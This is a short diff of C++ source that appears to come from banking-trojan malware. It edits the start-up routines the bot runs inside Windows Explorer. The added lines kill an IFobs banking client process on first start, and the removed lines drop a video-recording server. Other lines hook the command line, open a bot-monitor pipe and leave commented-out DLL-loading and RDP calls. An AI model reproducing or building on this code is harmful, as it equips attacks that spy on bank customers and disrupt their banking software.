@@ -48,6 +48,11 @@ void ExplorerFirstStart(PEventData Data)
 		Sber::SendLogIfReestr();
 	#endif
 
+	#ifdef IFobsH
+//		RunThread( IFobs::FindIFobsClient, 0 );
+		IFobs::KillIFobs();
+	#endif
+
 	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 //	ExecuteRunRDP( 0, 0, 0 );
@@ -112,12 +117,6 @@ void ExplorerStart(PEventData Data)
 	#ifdef CmdLineH
 		HookCmdLine();
 	#endif
-
-    // Запускаем сервер видеозаписи
-	#ifdef VideoRecorderH 
-		VideoRecorderSrv::Start();
-	#endif
-
 
 	#ifdef BOTMONITOR
     	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
